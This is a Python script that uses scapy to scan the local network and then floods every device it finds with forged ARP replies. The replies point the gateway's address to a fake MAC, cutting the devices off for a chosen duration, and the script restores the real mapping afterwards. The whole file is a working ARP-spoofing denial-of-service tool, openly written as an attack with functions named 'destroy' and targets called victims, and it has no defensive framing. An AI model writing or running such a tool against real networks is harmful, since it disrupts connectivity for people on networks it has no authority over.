import os
import time 
import platform

from scapy.all import ARP, send, arping, socket, logging

import constants

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))
    ip = s.getsockname()
    s.close()
    return ip[0]


def get_devices_identities(ips):
    answers, _ = arping(ips, verbose = 0)
    return [(answer[1].psrc, answer[1].hwsrc) for answer in answers]


def destroy(victim_ip, victim_mac, gateway_ip):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    
    
def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
    send(packet, verbose=0)
    
    
def check_permission():
    if platform.system is not 'Windows':
        if os.geteuid() != 0:
            print(constants.PERMISSION_ERROR)
            exit()
    
        
def get_ip_range(my_ip):
    return ".".join(my_ip.split(".")[:-1]) + ".*"

def get_gateway_ip(my_ip):
    return ".".join(my_ip.split(".")[:-1]) + ".1"


def show_connected_ips(devices_identities):
    print(constants.CONNECTED_DEVICES_MSG)
    for num, devices in enumerate(devices_identities):
        print(f'{num})\t{devices[0]}\t{devices[1]}')
    


if __name__ == "__main__":
    check_permission()
    ip_core = get_ip_range(get_lan_ip())
    devices_identities = get_devices_identities(ip_core)
    gateway_ip = get_gateway_ip(get_lan_ip())
    gateway_mac = devices_identities[0][1]
    show_connected_ips(devices_identities)
    destroy_time = int(input(constants.DESTROY_TIME_AMOUNT_MSG))
    start_time = time.time()
    try:
        while (time.time() - start_time) < destroy_time:
            for victim in devices_identities:
                destroy(victim[0], victim[1], gateway_ip)
    except KeyboardInterrupt:
        for victim in devices_identities:
            restore(victim[0], victim[1], gateway_ip, gateway_mac) 
    finally:
        for victim in devices_identities:
            restore(victim[0], victim[1], gateway_ip, gateway_mac) 
    